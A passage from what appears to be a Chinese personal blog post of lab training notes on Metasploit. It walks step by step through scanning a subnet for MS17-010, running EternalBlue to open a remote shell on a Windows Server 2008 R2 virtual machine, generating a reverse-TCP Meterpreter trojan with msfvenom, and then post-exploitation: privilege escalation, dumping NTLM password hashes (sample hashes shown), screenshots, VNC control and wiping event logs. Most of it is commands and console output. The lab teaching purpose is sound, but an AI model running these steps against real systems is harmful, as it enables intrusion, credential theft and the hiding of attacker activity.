   exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</code></pre>
<p>其中：eternalblue 就是永恒之蓝。</p>
<h5 id="2-检查存在漏洞的主机"><a href="#2-检查存在漏洞的主机" class="headerlink" title="2.检查存在漏洞的主机"></a>2.检查存在漏洞的主机</h5><pre><code class="hljs undefined">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010
msf5 auxiliary(scanner/smb/smb_ms17_010) &gt;</code></pre>
<pre><code class="hljs undefined">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; hosts -R

Hosts
=====

address         mac                name             os_name          os_flavor   os_sp  purpose  info  comments
-------         ---                ----             -------          ---------   -----  -------  ----  --------
192.168.92.1    00:50:56:c0:00:08  bogon            Unknown                             device         
192.168.92.2    00:50:56:f6:39:4b  bogon            Unknown                             device         
192.168.92.130  00:0c:29:ba:ab:08  WIN-PA5UULAVJOQ  Windows 2008 R2  Enterprise  SP1    server         
                     bogon            Unknown                             device         
192.168.92.254  00:50:56:e9:af:8c  bogon            Unknown                             device         

RHOSTS =&gt; 192.168.92.1 192.168.92.2 192.168.92.130 192.168.92.131 192.168.92.254

msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run

[-] 192.168.92.1:445      - An SMB Login Error occurred while connecting to the IPC$ tree.
[*] Scanned 1 of 5 hosts (20% complete)
[*] Scanned 2 of 5 hosts (40% complete)
[+] 192.168.92.130:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] Scanned 3 of 5 hosts (60% complete)
[*] Scanned 4 of 5 hosts (80% complete)
[*] Scanned 5 of 5 hosts (100% complete)
[*] Auxiliary module execution completed</code></pre>
<p>其中：Host is likely VULNERABLE to MS17-010!这一个我们可以对其进行攻击。即：192.168.92.130</p>
<h5 id="3-攻击主机"><a href="#3-攻击主机" class="headerlink" title="3.攻击主机"></a>3.攻击主机</h5><p>使用漏洞模块：</p>
<pre><code class="hljs undefined">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) &gt;</code></pre>
<p>设置：</p>
<pre><code class="hljs undefined">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOST 192.168.92.130
RHOST =&gt; 192.168.92.130</code></pre>
<p>运行攻击指令<code>exploit</code>：</p>
<pre><code class="hljs undefined">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit

[*] Started reverse TCP handler on 192.168.92.131:4444 
[*] 192.168.92.130:445 - Connecting to target for exploitation.
[+] 192.168.92.130:445 - Connection established for exploitation.
[+] 192.168.92.130:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.92.130:445 - CORE raw buffer dump (53 bytes)
[*] 192.168.92.130:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.92.130:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris
[*] 192.168.92.130:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P
[*] 192.168.92.130:445 - 0x00000030  61 63 6b 20 31                                   ack 1           
[+] 192.168.92.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.92.130:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.92.130:445 - Sending all but last fragment of exploit packet
[*] 192.168.92.130:445 - Starting non-paged pool grooming
[+] 192.168.92.130:445 - Sending SMBv2 buffers
[+] 192.168.92.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.92.130:445 - Sending final SMBv2 buffers.
[*] 192.168.92.130:445 - Sending last fragment of exploit packet!
[*] 192.168.92.130:445 - Receiving response from exploit packet
[+] 192.168.92.130:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.92.130:445 - Sending egg to corrupted connection.
[*] 192.168.92.130:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (192.168.92.131:4444 -&gt; 192.168.92.130:49897) at 2019-07-07 16:44:57 +0800
[+] 192.168.92.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.92.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.92.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</code></pre>
<p>最后显示表示攻击成功。</p>
<h4 id="Metasploit木马生成"><a href="#Metasploit木马生成" class="headerlink" title="Metasploit木马生成"></a>Metasploit木马生成</h4><p>【一些命令参考：<a href="https://www.jianshu.com/p/bad2fc55beff?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation】" target="_blank" rel="noopener">https://www.jianshu.com/p/bad2fc55beff?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation】</a></p>
<p>（在这里使用到了共享文件的方式，在自己电脑上新建文件夹，然后传到虚拟机上。</p>
<p>（共享文件打开方式：右键-设置-选项-共享文件夹-启动-添加</p>
<h5 id="1-生成木马【使用Kali端"><a href="#1-生成木马【使用Kali端" class="headerlink" title="1.生成木马【使用Kali端"></a>1.生成木马【使用Kali端</h5><pre><code class="hljs undefined">root@qzz:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=本地ip LPORT=6666 -f exe &gt;a.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes</code></pre>
<p>其中：a.exe 是生成的木马名字，可以自己设置。</p>
<p>然后我们可以看到已经生成的a.exe文件：</p>
<pre><code class="hljs undefined">root@qzz:~# ls
192_.gnmap  192_.nmap  192_.xml  公共  模板  视频  图片  文档  下载  音乐  桌面  a  a.exe</code></pre>
<p>走到所在的共享文件夹，然后可以查到该文件：</p>
<pre><code class="hljs undefined">root@qzz:~# cd /mnt/hgfs/share1
root@qzz:/mnt/hgfs/share1# cp /root/a.exe a.exe
root@qzz:/mnt/hgfs/share1# ls
a.exe</code></pre>
<h5 id="2-启动监听服务"><a href="#2-启动监听服务" class="headerlink" title="2.启动监听服务"></a>2.启动监听服务</h5><pre><code class="hljs undefined">root@qzz:~# msfdb run</code></pre>
<p>设置监听句柄：</p>
<pre><code class="hljs undefined">msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt;</code></pre>
<p>查看参数：</p>
<pre><code class="hljs undefined">msf5 exploit(multi/handler) &gt; show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target</code></pre>
<p>设置payload：</p>
<pre><code class="hljs undefined">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp</code></pre>
<p>再次查看：</p>
<pre><code class="hljs undefined">msf5 exploit(multi/handler) &gt; show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target</code></pre>
<p>设置ip和端口：</p>
<pre><code class="hljs undefined">msf5 exploit(multi/handler) &gt; set LHOST xxx
LHOST =&gt; xxx
msf5 exploit(multi/handler) &gt; set LPORT 6666
LPORT =&gt; 6666</code></pre>
<p>运行：（此处需要在windows系统里手动传入之前设置的木马，然后双击运行，在kali端写入run才能出现如下代码：</p>
<pre><code class="hljs undefined">msf5 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 192.168.xxx:6666 
[*] Sending stage (206403 bytes) to 192.168.xx.xxx
[*] Meterpreter session 1 opened (192.168.xxx:6666 -&gt; 192.168.92.128:49543) at 2019-07-08 13:40:37 +0800</code></pre>
<p>现在这个状态就是已经可以远程控制windows这台虚拟机了。</p>
<pre><code class="hljs undefined">meterpreter &gt;</code></pre>
<p>可以进行输入以下命令对windows虚拟机进行修改：</p>
<p>（具体可以输入help进行查看有哪些命令</p>
<p>【参考：<a href="https://www.cnblogs.com/backlion/p/9484949.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9484949.html</a></p>
<p><a href="https://www.freebuf.com/sectool/154752.html】" target="_blank" rel="noopener">https://www.freebuf.com/sectool/154752.html】</a></p>
<p>1）查看当前目录：</p>
<pre><code class="hljs undefined">cd：切换目标目录； 
cat：读取文件内容； 
del：删除文件； 
edit：使用vim编辑文件 
ls：获取当前目录下的文件； 
mkdir：新建目录； 
rmdir：删除目录</code></pre>
<p>2）上传下载文件：</p>
<pre><code class="hljs undefined">download : 可以帮助我们从目标系统中下载文件 
upload   : 则能够向目标系统上传文件。</code></pre>
<p>3）获得密码文件：</p>
<p>（此步骤需要提高权限，如下所示：</p>
<pre><code class="hljs undefined">//该命令用于提高权限
meterpreter &gt; getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
//该命令用于查询当前用户
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
//该命令用于查询密码信息
meterpreter &gt; run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY a08165ec0d8fd106e559a010fd77ed66...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...

//得到的密码信息
Administrator:500:aad3b435b51404eeaad3b435b51404ee:156e2a95f3c35674fb83ceb0693e39d2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xxx:1001:aad3b435b51404eeaad3b435b51404ee:df49e8812a10e919756bfefed1e6c899:::</code></pre>
<blockquote>
<p>数据的输出格式为：用户名：SID：LM哈希：NTLM哈希:::</p>
<p>NTLM破解网站 : <a href="https://hashkiller.co.uk/Cracker" target="_blank" rel="noopener">https://hashkiller.co.uk/Cracker</a></p>
</blockquote>
<p>4）屏幕截图（其中第二行为保存在哪里</p>
<pre><code class="hljs undefined">meterpreter &gt; screenshot
Screenshot saved to: /root/noZfQkmZ.jpeg</code></pre>
<p>5）使用vnc远程控制</p>
<pre><code class="hljs undefined">run vnc</code></pre>
<p>6）检测是否为虚拟机</p>
<pre><code class="hljs undefined">meterpreter &gt; run post/windows/gather/checkvm

[*] Checking if WIN-PA5UULAVJOQ is a Virtual Machine .....
[+] This is a VMware Virtual Machine</code></pre>
<p>7）运行制定程序</p>
<pre><code class="hljs undefined">meterpreter &gt; execute -f calc
Process 2128 created.</code></pre>
<pre><code class="hljs undefined">meterpreter &gt; idletime
User has been idle for: 1 min 41 secs</code></pre>
<p>8）查看</p>
<pre><code class="hljs undefined">meterpreter &gt; sysinfo
Computer        : WIN-PA5UULAVJOQ
OS              : Windows 2008 R2 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows</code></pre>
<p>9）清除事件日志</p>
<pre><code class="hljs undefined">meterpreter &gt; clearev
[*] Wiping 8 records from Application...
[*] Wiping 25 records from System...
[*] Wiping 14 records from Security...</code></pre>
<p>10）查看用户进行了哪些操作：</p>
<pre><code class="hljs undefined">meterpreter post/windows/gather/dumplinks

[*] Running module against WIN-PA5UULAVJOQ
[*] Running as SYSTEM extracting user list...
[*] Extracting lnk files for user Administrator at C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\...
[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\新建文本文档.lnk.
[*] No Recent Office files found for user Administrator. Nothing to do.
[*] Extracting lnk files for user anyapei at C:\Users\anyapei\AppData\Roaming\Microsoft\Windows\Recent\...
[*] No Recent Office files found for user anyapei. Nothing to do.</code></pre>
<p>11）shell可以直接进入cmd命令行。</p>
<pre><code class="hljs undefined">meterpreter &gt; shell
Process 1276 created.
Channel 13 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32&gt;</code></pre>
<p>以上出现了乱码问题。</p>
<p>执行以下命令解决乱码：</p>
<pre><code class="hljs undefined">chcp 65001</code></pre>

            </article>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/技术/">技术</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/网络安全/">网络安全</a>
                    
                      <a class="hover-with-bg" href="/tags/Metasploit/">Metasploit</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-6">
                    
                    
                      <a href="/2019/07/09/ARP攻击实战/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ARP攻击实战</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-6">
                    
                    
                      <a href="/2019/06/25/2019-5、6月记/">
                        <span class="hidden-mobile">2019-5、6月记</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

            
              <!-- Comments -->
              <div class="comments" id="comments">
                
                
  <div id="vcomments"></div>
  <script defer src="https://cdn.staticfile.org/valine/1.4.4/Valine.min.js" ></script>

  <script type="text/javascript">
    var oldLoadVa = window.onload;
    window.onload = function () {
      oldLoadVa && oldLoadVa();

      new Valine({
        el: "#vcomments",
        app_id: "3RO7uNsUa0mDFJeViDvb9hiv-gzGzoHsz",
        app_key: "vAOgCiCTzJqAcXPOCXMLwlSP",
        placeholder: "_(:з」∠)_有什么话想要对我说吗？",
        path: window.location.pathname,
        avatar: "retro",
        meta: ["nick","mail","link"],
        pageSize: "10",
        lang: "zh-CN",
        highlight: false,
        recordIP: false,
        serverURLs: "",
      });
    };
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" rel="nofollow noopener">comments
      powered by Valine.</a></noscript>


              </div>
            
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
  <a href="/" target="_blank" rel="nofollow noopener"> <b>方慕珩小可爱</b></a><br />
  由 <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a> 强力驱动  
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>主题：Fluid</span></a>
    

    

    
    <br />
  <span id="timeDate">载入天数...</span>
  <span id="times">载入时分秒...</span>
  <script>
  var now = new Date();
  function createtime(){
      var grt= new Date("02/01/2019 00:00:00");//此处修改你的建站时间或者网站上线时间
      now.setTime(now.getTime()+250);
      days = (now - grt ) / 1000 / 60 / 60 / 24;
      dnum = Math.floor(days);
      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
      hnum = Math.floor(hours);
      if(String(hnum).length ==1 ){
          hnum = "0" + hnum;
      }
      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
      mnum = Math.floor(minutes);
      if(String(mnum).length ==1 ){
                mnum = "0" + mnum;
      }
      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
      snum = Math.round(seconds);
      if(String(snum).length ==1 ){
                snum = "0" + snum;
      }
      document.getElementById("timeDate").innerHTML = "这颗小星球已经遨游了&nbsp"+dnum+"&nbsp天";
      document.getElementById("times").innerHTML = hnum + "&nbsp小时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
  }
  setInterval("createtime()",250);
  </script>
</div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/main.js" ></script>


  <script  src="/js/lazyload.js" ></script>



  
  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>





  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




<!-- Plugins -->



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "实训笔记-19年暑假前&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>







  
  
    <script>
      !function (e, t, a) {
        function r() {
          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
          requestAnimationFrame(r)
        }

        function n() {
          var t = "function" == typeof e.onclick && e.onclick;
          e.onclick = function (e) {
            t && t(), o(e)
          }
        }

        function o(e) {
          var a = t.createElement("div");
          a.className = "heart", s.push({
            el: a,
            x: e.clientX - 5,
            y: e.clientY - 5,
            scale: 1,
            alpha: 1,
            color: c()
          }), t.body.appendChild(a)
        }

        function i(e) {
          var a = t.createElement("style");
          a.type = "text/css";
          try {
            a.appendChild(t.createTextNode(e))
          } catch (t) {
            a.styleSheet.cssText = e
          }
          t.getElementsByTagName("head")[0].appendChild(a)
        }

        function c() {
          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
        }

        var s = [];
        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
          setTimeout(e, 1e3 / 60)
        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
      }(window, document);
    </script>
  



  <script>(function (i, s, o, g, r, a, m) {
      i['DaoVoiceObject'] = r;
      i[r] = i[r] ||
        function () {
          (i[r].q = i[r].q || []).push(arguments);
        };
      i[r].l = 1 * new Date();
      a = s.createElement(o);
      m = s.getElementsByTagName(o)[0];
      a.async = 1;
      a.src = g;
      a.charset = 'utf-8';
      m.parentNode.insertBefore(a, m);
    })(window, document, 'script', ('https:' === document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/56fbfd12.js", 'daovoice');
    daovoice('init', {
      app_id: "56fbfd12",
    });
    daovoice('update');
  </script>










</body>
</html>
